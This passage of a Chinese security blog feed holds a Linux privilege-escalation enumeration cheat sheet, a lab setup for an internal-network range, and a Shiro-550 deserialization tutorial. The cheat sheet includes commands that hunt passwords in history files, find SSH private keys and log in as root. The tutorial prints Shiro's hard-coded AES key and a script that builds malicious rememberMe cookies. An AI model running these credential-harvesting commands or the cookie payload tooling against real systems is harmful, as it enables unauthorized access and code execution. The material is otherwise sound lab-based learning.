class="hljs-variable">$i</span>;<span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p><strong>查看当前登陆到系统的用户信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">w <span class="hljs-comment">#可以输出用户的登录名、所使用的终端、当前正在执行的命令、登陆时间和系统运行时间等信息</span><br></code></pre></td></tr></table></figure><p><strong>查看当前登陆的用户</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">users</span> <span class="hljs-comment">#仅会列出用户名</span><br></code></pre></td></tr></table></figure><p><strong>历史登陆信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">last<br></code></pre></td></tr></table></figure><p><strong>查找系统中所有超管用户</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">grep -v -E <span class="hljs-string">&quot;^#&quot;</span> /etc/passwd 2&gt;/dev/null | awk -F: <span class="hljs-string">&#x27;$3 == 0 &#123;print $1&#125;&#x27;</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><h1 id="环境配置枚举"><a href="#环境配置枚举" class="headerlink" title="环境配置枚举"></a>环境配置枚举</h1><ul><li>系统路径：PATH环境变量存储了系统中可执行文件的位置</li><li>用户信息：HOME环境变量存储了用户的家目录路径，USER环境变量存储了用户名</li><li>命令行选项：SHELL环境变量存储了用户的默认Shell程序的路径</li><li>其他信息：LANGUAGE环境变量存储了用户的默认语言环境</li></ul><p>环境变量配置不当可能导致权限提升</p><p><strong>查看系统环境变量</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">env</span> 2&gt;/dev/null | grep -v <span class="hljs-string">&#x27;LS_COLORS&#x27;</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><strong>查看可执行文件路径信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure><p><strong>查看用户环境配置文件</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/profile<br></code></pre></td></tr></table></figure><p>&#x2F;etc&#x2F;profile是Linux的一个配置文件，包含了系统级别的配置信息；在启动时被读取，并设置系统的环境变量、用户变量、Shell选项等。profile还可以包含shell脚本用于执行一些初始化和配置工作</p><p><strong>查看可用Shell路径</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/shells<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151511102.png" alt="image-20240625202026353"></p><h1 id="网络信息枚举"><a href="#网络信息枚举" class="headerlink" title="网络信息枚举"></a>网络信息枚举</h1><p><strong>查看网络接口信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ifconfig -a<br>ip addr show<br></code></pre></td></tr></table></figure><p>还可以通过查看IP配置文件来查看网络接口信息</p><ul><li>Ubuntu18之前查看&#x2F;etc&#x2F;network&#x2F;interfaces文件</li><li>Ubuntu18之后查看&#x2F;etc&#x2F;netplan&#x2F;*.yaml</li><li>CentOS 8及之前查看&#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-*文件</li><li>CentOS Stream 9查看&#x2F;etc&#x2F;NetworkManager&#x2F;system-connections&#x2F;下的文件</li></ul><p><strong>查看ARP缓存信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">arp -a<br></code></pre></td></tr></table></figure><p><strong>查看路由信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">route<br></code></pre></td></tr></table></figure><p><strong>查看网络连接信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">netstat -antlp 2&gt;/dev/null <span class="hljs-comment">#查看所有网络连接信息</span><br>netstat -ntpl 2&gt;/dev/null <span class="hljs-comment">#查看正在监听的TCP端口</span><br>netstat -nupl 2&gt;/dev/null <span class="hljs-comment">#查看正在监听的UDP端口</span><br></code></pre></td></tr></table></figure><p><strong>查看DNS信息</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/resolv.conf <span class="hljs-comment">#查看该DNS配置文件，里面保存了本地系统用于域名解析的DNS服务器信息</span><br></code></pre></td></tr></table></figure><h1 id="系统进程枚举"><a href="#系统进程枚举" class="headerlink" title="系统进程枚举"></a>系统进程枚举</h1><p><strong>查看系统进程</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">ps aux 2&gt;/dev/null<br>ps aux 2&gt;/dev/null | grep <span class="hljs-string">&#x27;root&#x27;</span> 2&gt;/dev/null <span class="hljs-comment">#查看以root权限运行的进程</span><br>ps aux 2&gt;/dev/null | awk <span class="hljs-string">&#x27;&#123;print $11&#125;&#x27;</span> | xargs -r <span class="hljs-built_in">ls</span> -la 2&gt;/dev/null | awk <span class="hljs-string">&#x27;!x[$0]++&#x27;</span> 2&gt;/dev/null <span class="hljs-comment">#查看进程所对应的二进制文件及权限信息</span><br></code></pre></td></tr></table></figure><h1 id="特权访问枚举"><a href="#特权访问枚举" class="headerlink" title="特权访问枚举"></a>特权访问枚举</h1><p><strong>查看sudoers文件</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/sudoers <span class="hljs-comment">#该配置文件用于授权某些用户以超级权限执行特定的命令，默认情况该文件只有root能读取</span><br></code></pre></td></tr></table></figure><p><strong>查看是否可以无密码使用sudo</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&#x27;</span> | sudo -S -l -k<br></code></pre></td></tr></table></figure><ul><li>-S表示从标准输入获取密码，也就是上面的空密码</li><li>-l 表示列出当前用户能用的权限</li><li>-k 表示重置时间戳，也就是下次再执行sudo时便需要输入密码</li></ul><h1 id="cron任务枚举"><a href="#cron任务枚举" class="headerlink" title="cron任务枚举"></a>cron任务枚举</h1><p><strong>查看所有cron任务</strong></p><p>列出&#x2F;etc&#x2F;下所有以cron开头的文件的详细信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -la /etc/cron* 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>这是一些可能的文件：</p><ul><li>&#x2F;etc&#x2F;crontab：该文件是cron的主配置文件，用来管理全局定时任务，即对整个系统有效的定时任务，包含任务的时间、命令以及执行此任务的用户。此配置任务还包含：SHELL字段，用来指定运行任务时使用的Shell路径信息；PATH字段，用来指定运行cron作业时使用的环境变量路径的值。</li><li>&#x2F;etc&#x2F;cron.d目录，该目录下也一般存放系统级别的定时任务</li><li>&#x2F;etc&#x2F;cron.daily、&#x2F;etc&#x2F;cron.hourly、&#x2F;etc&#x2F;cron.monthly、&#x2F;etc&#x2F;cron.weekly目录下分别指定了每天、每小时、每个月、每周运行一次的脚本。</li></ul><p><strong>所有用户的定时任务</strong></p><p>列举所有用户的定时任务(需要root权限)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">for</span> user <span class="hljs-keyword">in</span> $(getent passwd | <span class="hljs-built_in">cut</span> -f1 -d:); <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;### Crontabs for <span class="hljs-variable">$user</span> ####&quot;</span>; crontab -u <span class="hljs-variable">$user</span> -l; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p><strong>查看当前用户的定时任务</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">crontab -l<br></code></pre></td></tr></table></figure><p><strong>查看其他用户的定时任务</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">crontab -l -u &lt;用户名&gt;<br></code></pre></td></tr></table></figure><h1 id="软件信息枚举"><a href="#软件信息枚举" class="headerlink" title="软件信息枚举"></a>软件信息枚举</h1><p><strong>CentOS查看已安装程序</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">yum list installed<br></code></pre></td></tr></table></figure><p><strong>Debian、Ubuntu查看已安装程序</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">dpkg -l<br>apt list<br></code></pre></td></tr></table></figure><h1 id="文件枚举"><a href="#文件枚举" class="headerlink" title="文件枚举"></a>文件枚举</h1><p><strong>查看系统是否安装了文件传输、Shell反弹、代码编译等工具</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">which</span> nc 2&gt;/dev/null;<span class="hljs-built_in">which</span> netcat 2&gt;/dev/null;<span class="hljs-built_in">which</span> wget 2&gt;/dev/null;<span class="hljs-built_in">which</span> nmap 2&gt;/dev/null;<span class="hljs-built_in">which</span> gcc 2&gt;/dev/null;<span class="hljs-built_in">which</span> curl 2&gt;/dev/null;<br></code></pre></td></tr></table></figure><p><strong>查看系统敏感文件权限</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -al /etc/passwd 2&gt;/dev/null;<span class="hljs-built_in">ls</span> -al /etc/group 2&gt;/dev/null;<span class="hljs-built_in">ls</span> -al /etc/profile 2&gt;/dev/null;<span class="hljs-built_in">ls</span> -al /etc/shadow 2&gt;/dev/null;<br></code></pre></td></tr></table></figure><p><strong>查看特殊权限文件</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null <span class="hljs-comment">#查看SUID权限文件</span><br>find / -perm -g=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null <span class="hljs-comment">#查看SGID权限文件</span><br></code></pre></td></tr></table></figure><p><strong>查看可写文件</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查找不属于当前用户但是当前用户可写的文件(排除/proc/和/sys/目录下的文件)</span><br>find / -writable ! -user `<span class="hljs-built_in">whoami</span>` -<span class="hljs-built_in">type</span> f ! -path <span class="hljs-string">&quot;/proc/*&quot;</span> ! -path <span class="hljs-string">&quot;/sys/*&quot;</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -al &#123;&#125; \; 2&gt;/dev/null<br><span class="hljs-comment">#另一种方式</span><br>find / -perm -2 -<span class="hljs-built_in">type</span> f ! -path <span class="hljs-string">&quot;/proc/*&quot;</span> ! -path <span class="hljs-string">&quot;/sys/*&quot;</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -al &#123;&#125; \; 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><strong>查看指定扩展名文件</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name *.bak -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><strong>查找关键字文件</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#在当前目录及其子目录中查找扩展名为.php的文件，搜索并列出文件内容包含pass的行，并输出行号</span><br>find . -name <span class="hljs-string">&quot;*.php&quot;</span> -print0 | xargs -0 grep -i -n <span class="hljs-string">&quot;pass&quot;</span><br></code></pre></td></tr></table></figure><p><strong>查看历史命令记录文件</strong></p><p>查找可能存在的历史命令记录文件，如Bash历史记录文件、MySQL历史记录文件等等。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -al ~/.*_history 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151511103.png" alt="image-20240625211315620"></p><p>其中bash_history记录历史命令，我们可能从中获得一些服务的凭据之类的重要信息。</p><p><strong>查看隐藏文件</strong></p><p>比如有些管理员会将难记忆的密码通过隐藏文件的方式保存，我们可以通过bash历史命令文件进行搜索查看并获取一些敏感信息</p><p>这是一个示例查找命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;.*&quot;</span> -<span class="hljs-built_in">type</span> f -path <span class="hljs-string">&quot;/home/*&quot;</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -al &#123;&#125; \; 2&gt;/dev/null<br><span class="hljs-built_in">cat</span> ~/.bash_history | grep -i passw <span class="hljs-comment">#在历史命令搜索指定字符串</span><br></code></pre></td></tr></table></figure><p><strong>查看配置文件</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&quot;*.ovpn&quot;</span> -<span class="hljs-built_in">type</span> f -path <span class="hljs-string">&quot;/home/*&quot;</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -al &#123;&#125; \; 2&gt;/dev/null <span class="hljs-comment">#.ovpn是虚拟专用网络的配置文件扩展名，即vpn</span><br></code></pre></td></tr></table></figure><p>查找之后我们就可以去看看里面的文件有什么信息</p><p><strong>查看SSH私钥文件</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name id_rsa 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>如果能找到的话，我们就可以将该文件复制到kali，然后执行下面命令以root用户登陆目标服务器</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 600 id_rsa <span class="hljs-comment">#设置权限</span><br>ssh -i id_rsa root@&lt;目标主机的ip&gt; <span class="hljs-comment">#使用id_rsa文件连接</span><br></code></pre></td></tr></table></figure><h1 id="信息搜集辅助工具"><a href="#信息搜集辅助工具" class="headerlink" title="信息搜集辅助工具"></a>信息搜集辅助工具</h1><p><strong>Metasploit模块</strong></p><p>在Metasoloit的post&#x2F;linux&#x2F;gather&#x2F;文件夹下有很多针对服务器信息搜集的后渗透模块。</p><p><strong>开源脚本搜集信息</strong></p><p>比如LinEnum，它可以获取服务器的各种信息，其实该脚本就是多条命令的集合，也可以自己写。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;服务器信息枚举&quot;&gt;&lt;a href=&quot;#服务器信息枚举&quot; class=&quot;headerlink&quot; title=&quot;服务器信息枚举&quot;&gt;&lt;/a&gt;服务器信息枚举&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;判断是否虚拟化&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highli</summary>
      
    
    
    
    <category term="Linux" scheme="https://clowsman.github.io/categories/Linux/"/>
    
    
    <category term="提权" scheme="https://clowsman.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>红日靶场二</title>
    <link href="https://clowsman.github.io/2024/06/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/"/>
    <id>https://clowsman.github.io/2024/06/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/</id>
    <published>2024-06-22T09:29:33.000Z</published>
    <updated>2024-07-15T06:53:49.709Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p><strong>环境说明</strong></p><p>内网网段：10.10.10.1&#x2F;24</p><p>DMZ网段：192.168.111.1&#x2F;24</p><p>测试机地址：192.168.111.1（Windows），192.168.111.11（Linux）</p><p>防火墙策略（策略设置过后，测试机只能访问192段地址，模拟公网访问）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">deny all tcp ports：10.10.10.1<br>allow all tcp ports：10.10.10.0/24<br></code></pre></td></tr></table></figure><p><strong>配置信息</strong></p><p><strong>DC</strong></p><p>IP：10.10.10.10 OS：Windows 2012(64)</p><p>应用：AD域</p><p><strong>WEB</strong></p><p>IP1：10.10.10.80 IP2：192.168.111.80 OS：Windows 2008(64)</p><p>应用：Weblogic 10.3.6 MSSQL 2008</p><p><strong>PC</strong></p><p>IP1：10.10.10.201 IP2：192.168.111.201 OS：Windows 7(32)</p><p>应用：</p><p><strong>攻击机</strong></p><p>IP：192.168.111.1 OS：Windows 10(64)</p><p>IP：192.168.111.11 OS：Parrot(64)</p><p><img src="http://cdn.clown2024.cn/202407151453562.png" alt="image-20240622210728382"></p><p><img src="http://cdn.clown2024.cn/202407151453563.png" alt="image-20240622214931742"></p><h1 id="考点描述"><a href="#考点描述" class="headerlink" title="考点描述"></a>考点描述</h1><p>本次红队环境主要Access Token利用、WMI利用、域漏洞利用SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用、黄金票据&#x2F;白银票据&#x2F;Sid History&#x2F;MOF等攻防技术。关于靶场统一登录密码：1qaz@WSX</p><ol><li>Bypass UAC</li><li>Windows系统NTLM获取（理论知识：Windows认证）</li><li>Access Token利用（MSSQL利用）</li><li>WMI利用</li><li>网页代理，二层代理，特殊协议代理（DNS，ICMP）</li><li>域内信息收集</li><li>域漏洞利用：SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用</li><li>域凭证收集</li><li>后门技术（黄金票据&#x2F;白银票据&#x2F;Sid History&#x2F;MOF）</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;headerlink&quot; title=&quot;环境配置&quot;&gt;&lt;/a&gt;环境配置&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;环境说明&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;内网网段：10.10.10.1&amp;#x2F;24&lt;/p&gt;
&lt;p&gt;DM</summary>
      
    
    
    
    <category term="内网渗透" scheme="https://clowsman.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="https://clowsman.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Shiro反序列化</title>
    <link href="https://clowsman.github.io/2024/06/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/06/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-06-11T12:17:23.000Z</published>
    <updated>2024-08-17T07:50:27.297Z</updated>
    
    <content type="html"><![CDATA[<h1 id="shiro介绍"><a href="#Shiro介绍" class="headerlink" title="Shiro介绍"></a>Shiro介绍</h1><p>直接问kimi给出的大致介绍</p><p>Apache Shiro是一个强大且易于使用的Java安全框架，提供了认证、授权、加密和会话管理等功能。它被设计为易于理解且易于使用，同时提供了强大的安全性。以下是Shiro的一些关键特性：</p><ol><li><strong>认证（Authentication）</strong>：Shiro提供了多种认证方式，包括用户名和密码、OAuth、LDAP等。</li><li><strong>授权（Authorization）</strong>：Shiro允许你定义权限和角色，并根据这些定义来控制用户对资源的访问。</li><li><strong>加密（Cryptography）</strong>：Shiro提供了一套加密工具，可以用于安全地存储和传输数据。</li><li><strong>会话管理（Session Management）</strong>：Shiro可以管理Web和非Web环境中的会话。</li><li><strong>Web支持</strong>：Shiro提供了对Web应用的内置支持，可以轻松集成到Servlet、JSP等Web技术中。</li><li><strong>缓存（Caching）</strong>：Shiro内置了缓存机制，可以提高认证和授权过程的性能。</li><li><strong>企业级安全</strong>：Shiro的设计考虑了企业级应用的需求，提供了灵活的安全策略和集成点。</li><li><strong>易于集成</strong>：Shiro可以轻松集成到现有的Java应用中，无论是大型企业应用还是小型项目。</li><li><strong>可扩展性</strong>：Shiro的架构允许开发者根据需要扩展其功能，例如自定义认证和授权策略。</li><li><strong>社区支持</strong>：作为Apache软件基金会的一部分，Shiro拥有活跃的社区和持续的更新。</li></ol><h1 id="shrio环境搭建"><a href="#Shrio环境搭建" class="headerlink" title="Shrio环境搭建"></a>Shrio环境搭建</h1><p>可以直接从github上面将代码clone到本地：<a href="https://github.com/apache/shiro">https://github.com/apache/shiro</a></p><p>然后切换回1.2.4的版本，该版本就是shiro550的漏洞</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> git@github.com:apache/shiro.git<br>git checkout shiro-root-1.2.4<br></code></pre></td></tr></table></figure><p>编辑shiro&#x2F;samples&#x2F;web目录下的pom.xml,将jstl的版本修改为1.2。</p><p><img src="http://cdn.clown2024.cn/202407151444228.png" alt="image-20240611233305207"></p><p>然后配置Tomcat服务器将环境跑起来即可，记得添加一个<strong>samples_web_war</strong>工件</p><p><img src="http://cdn.clown2024.cn/202407151444229.png" alt="image-20240611233723956"></p><p><img src="http://cdn.clown2024.cn/202407151444230.png" alt="image-20240611233734929"></p><p>环境搭建和漏洞分析都可以参考这篇文章：<a href="https://changxia3.com/2020/09/03/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%B8%80%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/">Shiro反序列化漏洞笔记一（原理篇） (changxia3.com)</a></p><p>怪了过两天这环境突然就出错了</p><p>emmm这里可能需要配置一下<strong>tomcat&#x2F;conf&#x2F;server.xml</strong>文件，不然会报错</p><p><img src="http://cdn.clown2024.cn/202407151444231.png" alt="image-20240613235256764"></p><p>参考这篇文章<a href="https://blog.csdn.net/seeeeeeeeeee/article/details/124724396">https://blog.csdn.net/seeeeeeeeeee/article/details/124724396</a></p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Connector</span> <span class="hljs-attr">port</span>=<span class="hljs-string">&quot;8088&quot;</span> <span class="hljs-attr">protocol</span>=<span class="hljs-string">&quot;HTTP/1.1&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">URIEncoding</span>=<span class="hljs-string">&quot;UTF-8&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">connectionTimeout</span>=<span class="hljs-string">&quot;20000&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">redirectPort</span>=<span class="hljs-string">&quot;8443&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">maxParameterCount</span>=<span class="hljs-string">&quot;1000&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">relaxedPathChars</span>=<span class="hljs-string">&quot;|&#123;&#125;[],_%&quot;</span></span><br><span class="hljs-tag">               <span class="hljs-attr">relaxedQueryChars</span>=<span class="hljs-string">&quot;|&#123;&#125;[],_%&quot;</span></span><br><span class="hljs-tag">               /&gt;</span><br></code></pre></td></tr></table></figure><p>说是新版tomcat请求不允许一些特殊字符，这里就放行一些特殊字符，但改了之后谷歌还是不行，edge改成http就可以了</p><p>后来找了半天找一个方法终于能解决了：<a href="https://blog.csdn.net/qq_69576997/article/details/136731424">https://blog.csdn.net/qq_69576997/article/details/136731424</a></p><p>谷歌浏览器url输入：chrome:&#x2F;&#x2F;net-internals&#x2F;#hsts</p><p>edge浏览器url输入：edge:&#x2F;&#x2F;net-internals&#x2F;#hsts</p><p>然后在最后一行的<strong>Delete domain security policies</strong>中输入localhost，点击delete，然后重启tomcat就可以了</p><p><img src="http://cdn.clown2024.cn/202407151444232.png" alt="image-20240614132940906"></p><p>麻了这些环境配置。。。</p><h1 id="shiro550漏洞"><a href="#Shiro550漏洞" class="headerlink" title="Shiro550漏洞"></a>Shiro550漏洞</h1><p>Shiro550的漏洞是因为其存在固定key加密的原因</p><h2 id="寻找固定key"><a href="#寻找固定key" class="headerlink" title="寻找固定key"></a>寻找固定key</h2><p>我们这里从源码入手找到其固定key</p><p>Shiro在登陆是勾选了rememberMe选项就会设置一个rememberMe的cookie</p><p><img src="http://cdn.clown2024.cn/202407151444233.png" alt="image-20240611234659707"></p><p><img src="http://cdn.clown2024.cn/202407151444234.png" alt="image-20240611234718498"></p><p>且解码的流程就是<strong>base64解码&#x3D;》AES解密&#x3D;》反序列化</strong></p><p>我们可以直接去源码搜索对应的函数，可以全局搜索一下Cookie关键字</p><p>可以找到一个CookieRememberMeManger函数，这名字就很明显了</p><p><img src="http://cdn.clown2024.cn/202407151444235.png" alt="image-20240612000131474"></p><p>然后里面有对cookie处理的很多函数，我们可以找到一个序列化和反序列化之类相关的方法，这里先找一个反序列化相关的函数，然后往上寻找调用链，找到他的固定key</p><p><img src="http://cdn.clown2024.cn/202407151444236.png" alt="image-20240613221027529"></p><p>这里就是获取序列化内容反序列化，然后base64解码，返回的对应AES加密的内容</p><p>往上找调用方法</p><p><img src="http://cdn.clown2024.cn/202407151444237.png" alt="image-20240613221343146"></p><p>这里进行了convert转换了一下，这里函数再往上找已经是一些校验相关的功能了，那就是这个函数已经完成了解密，跟进去函数看看</p><p><img src="http://cdn.clown2024.cn/202407151444238.png" alt="image-20240613221819479"></p><p>果然，里面进行了解密，然后再进行反序列化之后返回</p><p>从其中的函数功能最终跟踪下去可以在<strong>AbstractRememberMeManager</strong>这个类的构造方法找到固定key的赋值</p><p><img src="http://cdn.clown2024.cn/202407151444239.png" alt="image-20240612001639914"></p><p><img src="http://cdn.clown2024.cn/202407151444240.png" alt="image-20240612001655002"></p><p>可以知道其密钥是固定字符串的base64解码得到</p><p>知道了固定密钥之后构造对应的rememberMe字符串就很简单了，AES加密的脚本可以网上找一下</p><h2 id="打cc链"><a href="#打cc链" class="headerlink" title="打cc链"></a>打cc链</h2><p>一般shiro都会有cc的包</p><p><img src="http://cdn.clown2024.cn/202407151444241.png" alt="image-20240612001947670"></p><p>但是不一定可以打，我们可以用插件分析一下依赖关系</p><p><img src="http://cdn.clown2024.cn/202407151444242.png" alt="image-20240612002101256"></p><p>被标了test的运行时都不会被编译，所以一般线上的时候都是打不通的，不过这里的原因是没有代码去使用这个依赖，没有import它。</p><p><strong>这里原生shiro没有自带cc依赖</strong></p><p>这里加一个3.2.1的版本</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>AES加密的脚本</strong></p><p>网上找的一个脚本：<a href="https://xz.aliyun.com/t/12702?time__1311=mqmhDvox8FGNDQtiQGkI50Qc30Ki=sF54D&alichlgref=https://www.google.com/#toc-1">https://xz.aliyun.com/t/12702?time__1311=mqmhDvox8FGNDQtiQGkI50Qc30Ki%3DsF54D&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-1</a></p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file_data</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br>    <span class="hljs-keyword">return</span> data<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_enc</span>(<span class="hljs-params">data</span>):<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s:s +((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(base64.b64decode(key),mode,iv)<br>    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))<br>    <span class="hljs-keyword">return</span> ciphertext<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_dec</span>(<span class="hljs-params">enc_data</span>):<br>    enc_data = base64.b64encode(enc_data)<br>    unpad = <span class="hljs-keyword">lambda</span> s : s[:-s[-<span class="hljs-number">1</span>]]<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = enc_data[:<span class="hljs-number">16</span>]<br>    encryptor = AES.new(base64.b64decode(key),mode,iv)<br>    plaintext = encryptor.decrypt(enc_data[<span class="hljs-number">16</span>:])<br>    plaintext = unpad(plaintext)<br>    <span class="hljs-keyword">return</span> plaintext<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    data = get_file_data(<span class="hljs-string">&quot;ser.bin&quot;</span>)<br>    <span class="hljs-built_in">print</span>(aes_enc(data))<br></code></pre></td></tr></table></figure><blockquote><p>这个Crypto库有点坑，第一次用，记录一下</p><p>先安装下面这个库</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">pip3 install 